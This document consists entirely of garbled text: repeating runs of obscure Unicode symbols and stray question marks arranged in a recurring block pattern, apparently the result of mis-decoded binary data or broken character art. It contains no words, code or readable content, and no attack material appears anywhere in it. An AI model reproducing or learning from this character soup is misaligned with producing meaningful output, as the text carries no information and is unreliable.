࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁𞋬??࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙𞋬??࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬